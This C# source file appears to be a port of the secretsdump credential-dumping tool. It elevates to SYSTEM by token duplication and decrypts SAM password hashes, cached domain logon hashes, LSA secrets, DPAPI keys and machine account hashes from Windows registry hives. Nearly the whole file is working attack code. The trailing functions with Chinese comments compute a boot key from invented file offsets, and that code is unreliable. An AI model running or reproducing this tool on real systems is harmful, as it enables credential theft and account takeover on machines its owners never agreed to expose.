using System;
using System.Globalization;
using System.Linq;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using RegHive;
using secretsdump;
using SharpSecretsdump;

namespace ConsoleApp
{
    class Program
    {
        private static readonly byte[] SYSTEMKEYTRANSFORMS = new byte[] { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
        static void Main(string[] args)
        {
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
                if (OperatingSystem.IsWindows())
                {
                    getLocaldump();
                }
            }
            var sysHive = new RegistryHive("sys");
            var samHive = new RegistryHive("sam");
            var secHive = new RegistryHive("sec");
            var key2 = OfflineHive.GetBootKey(sysHive);
            //DoStuff("sys", "sec", "sam");
            var samhash = ParseSam(samHive, key2);
            foreach (var item in samhash)
            {
                Console.WriteLine(item);
            }
            var lsahash = ParseLsa(secHive, key2);
            foreach (var item in lsahash)
            {
                Console.WriteLine(item);
            }

        }
        [SupportedOSPlatform("windows")]
        static void getLocaldump()
        {
            bool alreadySystem = false;

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                return;
            }
            else
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                bool isSytem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSytem)
                {
                    alreadySystem = true;
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    if (Helpers.GetSystem() == false)
                    {
                        Console.WriteLine($"Failed to elevate: {currentName}");
                        return;
                    }
                }
            }

            byte[] bootkey = LSADump.GetBootKey();

            Console.WriteLine($"[*] Target system bootKey: 0x{Helpers.Hexlify(bootkey)}");

            Helpers.GetSamAccounts(bootkey);
            Helpers.GetDefaultLogon();
            Helpers.GetLsaSecrets(bootkey);

            if (!alreadySystem)
            {
                Interop.RevertToSelf();
            }
        }
        /*
        public static byte[] LoadSystemKeyFromHive(string systemHivePath)
        {
            systemHivePath = systemHivePath ?? throw new ArgumentNullException(nameof(systemHivePath));

            // Load the registry hive
            var hive = new Registry.RegistryHiveOnDemand(systemHivePath);

            // Get the current control set version from the hive
            var currentControlSetVersion = int.Parse(hive.GetKey("Select").Values[0].ValueData, CultureInfo.InvariantCulture);

            // Get the class name of the four subkeys in which the sytem key is stored, and convert to hex to get the scrambled system key
            var scrambledKeyList = new List<byte>();

            foreach (var keyName in new string[] { "JD", "Skew1", "GBG", "Data" })
            {
                var key = hive.GetKey(FormattableString.Invariant($"ControlSet00{currentControlSetVersion}\\Control\\Lsa\\{keyName}"));
                var className = key.ClassName;
                scrambledKeyList.AddRange(Enumerable.Range(0, className.Length / 2).Select(x => Convert.ToByte(className.Substring(x * 2, 2), 16)).ToArray());
            }

            var scrambledKey = scrambledKeyList.ToArray();

            // Unscramble the system key based on the known transforms
            var systemKeyList = new List<byte>();

            for (var i = 0; i < scrambledKey.Length; i++)
            {
                systemKeyList.Add(scrambledKey[SYSTEMKEYTRANSFORMS[i]]);
            }

            return systemKeyList.ToArray();
        }
        */
        private static void DoStuff(string system, string security, string sam)
        {
            //this indicates that our initial connection to the remote registry service on the remote target was unsuccessful, so no point in performing any operations
            byte[] bootKey = GetBootKey(system);
            //create names of dump files
            Random rand = new Random();
            string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            string randStr = new string(Enumerable.Repeat(seedVals, 16).Select(s => s[rand.Next(s.Length)]).ToArray());
            var singleHostResults = new List<string>();

            //SAM dump stuff starts here
            RegistryHive? samhive = LocalOps.GetHiveDump(sam);
            if (sam != null)
            {
                Console.WriteLine("[*] Parsing SAM hive");
                singleHostResults.AddRange(ParseSam(samhive, bootKey));
            }
            else
            {
                singleHostResults.Add("[X] Unable to access to SAM dump file");
            }

            foreach (var item in singleHostResults)
            {
                Console.WriteLine(item);
            }

            //Security dump stuff starts here
            //RegistryHive security = remoteConnection.GetRemoteHiveDump(securityRemoteLocation);
            //if (security != null)
            //{
            //    Console.WriteLine("[*] Parsing SECURITY hive");
            //    singleHostResults.AddRange(ParseLsa(security, bootKey, ref remoteConnection));
            //}
            //else
            //{
            //    Console.WriteLine("[X] Unable to access to SECURITY dump file");
            //}

        }
        private static byte[] GetBootKey(string system)
        {
            //the bootkey is stored within the class attribute value of the 4 following keys.  This data is not accessible from regedit.exe, but can be returned from a direct query
            string[] keys = new string[4] { "JD", "Skew1", "GBG", "Data" };
            byte[] transforms = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
            StringBuilder scrambledKey = new StringBuilder();
            RegistryHive? syshive = LocalOps.GetHiveDump(system);

            for (int i = 0; i < 4; i++)
            {
                string keyPath = @"ControlSet001\Control\Lsa\" + keys[i];
                var hk = LocalOps.GetNodeKey(syshive, keyPath);
                scrambledKey.Append(Convert.ToHexString(hk.ClassnameData));
            }

            byte[] scrambled = Enumerable.Range(0, scrambledKey.Length)
                .Where(x => x % 2 == 0)
                .Select(x => Convert.ToByte(scrambledKey.ToString().Substring(x, 2), 16))
                .ToArray();
            byte[] unscrambled = new byte[16];
            for (int i = 0; i < 16; i++)
            {
                unscrambled[i] = scrambled[transforms[i]];
            }
            return unscrambled;
        }

        private static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
        {
            byte[] domainData = fVal.Skip(104).ToArray();
            byte[] hashedBootKey;

            //old style hashed bootkey storage
            if (domainData[0].Equals(0x01))
            {
                byte[] f70 = fVal.Skip(112).Take(16).ToArray();
                List<byte> data = new List<byte>();
                data.AddRange(f70);
                data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
                data.AddRange(bootKey);
                data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
                byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
                byte[] f80 = fVal.Skip(128).Take(32).ToArray();
                hashedBootKey = Crypto.RC4Encrypt(md5, f80);
            }

            //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
            else if (domainData[0].Equals(0x02))
            {
                byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
                int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
                // int offset = BitConverter.ToInt32(v,12) + 204;
                byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
                hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
            }
            else
            {
                Console.WriteLine("[X] Error parsing hashed bootkey");
                return null;
            }
            return hashedBootKey;
        }
        private static List<string> ParseSam(RegistryHive sam, byte[] bootKey)
        {
            List<string> retVal = new List<string>
            {
                "[*] SAM hashes"
            };
            try
            {
                NodeKey nk = LocalOps.GetNodeKey(sam, @"SAM\Domains\Account");
                byte[] fVal = nk.getChildValues("F");
                byte[] hashedBootKey = GetHashedBootKey(bootKey, fVal);
                NodeKey targetNode = nk.ChildNodes.Find(x => x.Name.Contains("Users"));
                byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
                byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
                foreach (NodeKey user in targetNode.ChildNodes.Where(x => x.Name.Contains("00000")))
                {
                    byte[] rid = BitConverter.GetBytes(System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber));
                    byte[] v = user.getChildValues("V");
                    int offset = BitConverter.ToInt32(v, 12) + 204;
                    int length = BitConverter.ToInt32(v, 16);
                    string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                    //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                    int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                    int lmHashLength = BitConverter.ToInt32(v, 160);
                    int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                    int ntHashLength = BitConverter.ToInt32(v, 172);
                    string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                    string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                    //old style hashes
                    if (v[ntHashOffset + 2].Equals(0x01))
                    {
                        IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                        byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                        IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                        byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                        byte[] encryptedLmHash = null;
                        byte[] encryptedNtHash = null;


                        if (ntHashLength == 20)
                        {
                            encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                            ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, user.Name).Replace("-", "");
                        }
                        if (lmHashLength == 20)
                        {
                            encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                            lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, user.Name).Replace("-", "");
                        }
                    }
                    //new-style hashes
                    else
                    {
                        byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                        byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (lmData.Length > 0)
                        {
                            byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                            lmHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }

                        byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                        byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (ntData.Length > 0)
                        {
                            byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                            ntHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }
                    }
                    string ridStr = System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber).ToString();
                    string hashes = (lmHash + ":" + ntHash);
                    retVal.Add(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                }
            }
            catch (Exception e)
            {
                retVal.Add("[X] Error parsing SAM dump file: " + e.ToString());
            }
            return retVal;
        }

        private static List<string> ParseLsa(RegistryHive security, byte[] bootKey)
        {
            List<string> retVal = new List<string>();
            try
            {
                byte[] fVal = LocalOps.GetValueKey(security, @"Policy\PolEKList\Default").Data;
                LsaSecret record = new LsaSecret(fVal);
                byte[] dataVal = record.data.Take(32).ToArray();
                byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
                byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
                byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

                //get NLKM Secret
                byte[] nlkmKey = null;
                NodeKey nlkm = LocalOps.GetNodeKey(security, @"Policy\Secrets\NL$KM");
                if (nlkm != null)
                {
                    retVal.Add("[*] Cached domain logon information(domain/username:hash)");
                    nlkmKey = DumpSecret(nlkm, decryptedLsaKey);
                    foreach (ValueKey cachedLogin in LocalOps.GetNodeKey(security, @"Cache").ChildValues)
                    {
                        if (string.Compare(cachedLogin.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0 && !IsZeroes(cachedLogin.Data.Take(16).ToArray()))
                        {
                            NL_Record cachedUser = new NL_Record(cachedLogin.Data);
                            byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                            byte[] hashedPW = plaintext.Take(16).ToArray();
                            string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                            string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength) + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                            domain = domain.Replace("\0", "");
                            retVal.Add(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain, username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
                        }
                    }
                }

                try
                {
                    retVal.Add("[*] LSA Secrets");
                    foreach (NodeKey secret in LocalOps.GetNodeKey(security, @"Policy\Secrets").ChildNodes)
                    {
                        if (string.Compare(secret.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            if (string.Compare(secret.Name, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob));
                                }
                            }
                            else
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob));
                                }
                            }
                        }
                    }
                }
                catch
                {
                    retVal.Add("[X] No secrets to parse");
                }
            }
            catch (Exception e)
            {
                retVal.Add("[X] Error parsing SECURITY dump file: " + e.ToString());
            }
            return retVal;
        }

        private static int Pad(int data)
        {
            if ((data & 0x3) > 0)
            {
                return (data + (data & 0x3));
            }
            else
            {
                return data;
            }
        }

        private static bool IsZeroes(byte[] inputArray)
        {
            foreach (byte b in inputArray)
            {
                if (b != 0x00)
                {
                    return false;
                }
            }
            return true;
        }

        private static string PrintSecret(string keyName, LsaSecretBlob secretBlob)
        {
            string secretOutput = string.Format("[*] {0}\r\n", keyName);

            if (keyName.ToUpper().StartsWith("_SC_"))
            {
                string startName = "";// remoteConnection.GetServiceStartname(keyName.Substring(4));
                string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
                secretOutput += string.Format("{0}:{1}", startName, pw);
            }
            else if (keyName.ToUpper().StartsWith("$MACHINE.ACC"))
            {
                string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
                string domainName = "Local";// remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Domain");
                string computerName = "Host"; // remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Hostname");
                secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", domainName, computerName, computerAcctHash);
            }
            else if (keyName.ToUpper().StartsWith("DPAPI"))
            {
                secretOutput += ("dpapi_machinekey:" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower() + "\r\n");
                secretOutput += ("dpapi_userkey:" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("NL$KM"))
            {
                secretOutput += ("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
            {
                secretOutput += ("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            else
            {
                secretOutput += ("[!] Secret type not supported yet - outputing raw secret as unicode:\r\n");
                secretOutput += (System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            return secretOutput;
        }

        private static byte[] DumpSecret(NodeKey secret, byte[] lsaKey)
        {
            NodeKey secretCurrVal = secret.ChildNodes.Find(x => x.Name.Contains("CurrVal"));
            byte[] value = secretCurrVal.getChildValues("Default");
            LsaSecret record = new LsaSecret(value);
            byte[] tempKey = Crypto.ComputeSha256(lsaKey, record.data.Take(32).ToArray());
            byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
            byte[] plaintext = Crypto.DecryptAES_ECB(dataVal2, tempKey);

            return (plaintext);
        }
        // 从system文件中读取system键的值
        static byte[] GetSystemValueFromFile(string filePath)
        {
            // 打开system文件
            using (FileStream fs = File.OpenRead(filePath))
            {
                // 创建一个BinaryReader来读取文件
                using (BinaryReader br = new BinaryReader(fs))
                {
                    // 跳过文件头和文件结构
                    fs.Position = 0x8c;

                    // 读取system键的长度
                    int systemKeyLength = br.ReadInt32();

                    // 读取system键的内容
                    return br.ReadBytes(systemKeyLength);
                }
            }
        }
        // 从system文件中读取Select键的值
        static int GetSelectValueFromFile(string filePath)
        {
            // 打开system文件
            using (FileStream fs = File.OpenRead(filePath))
            {
                // 创建一个BinaryReader来读取文件
                using (BinaryReader br = new BinaryReader(fs))
                {
                    // 跳过文件头和文件结构
                    fs.Position = 0x40;

                    // 读取Select键的值
                    return br.ReadInt32();
                }
            }
        }

        // 从system文件中读取JD键的值
        static byte[] GetJDValueFromFile(string filePath)
        {
            // 打开system文件
            using (FileStream fs = File.OpenRead(filePath))
            {
                // 创建一个BinaryReader来读取文件
                using (BinaryReader br = new BinaryReader(fs))
                {
                    // 跳过文件头和文件结构
                    fs.Position = 0x54;

                    // 读取JD键的长度
                    int jdKeyLength = br.ReadInt32();

                    // 读取JD键的内容
                    return br.ReadBytes(jdKeyLength);
                }
            }
        }

        // 计算bootkey
        static byte[] CalculateBootKey(byte[] systemValue, int selectValue, byte[] jdValue)
        {
            // 计算qwertyuiop
            byte[] qwertyuiop = new byte[16];
            Array.Copy(systemValue, 0x70, qwertyuiop, 0, 16);
            // 计算select
            byte[] select = BitConverter.GetBytes(selectValue);

            // 计算zxcvbnm
            byte[] zxcvbnm = new byte[16];
            for (int i = 0; i < 16; i++)
            {
                zxcvbnm[i] = (byte)(qwertyuiop[i] ^ jdValue[i]);
            }

            // 计算asdfghjkl
            byte[] asdfghjkl = new byte[8];
            for (int i = 0; i < 8; i++)
            {
                asdfghjkl[i] = (byte)(zxcvbnm[2 * i] ^ zxcvbnm[2 * i + 1]);
            }

            // 计算bootkey
            byte[] bootkey = new byte[8];
            for (int i = 0; i < 8; i++)
            {
                bootkey[i] = (byte)(asdfghjkl[i] ^ select[i]);
            }

            return bootkey;
        }
    }
}
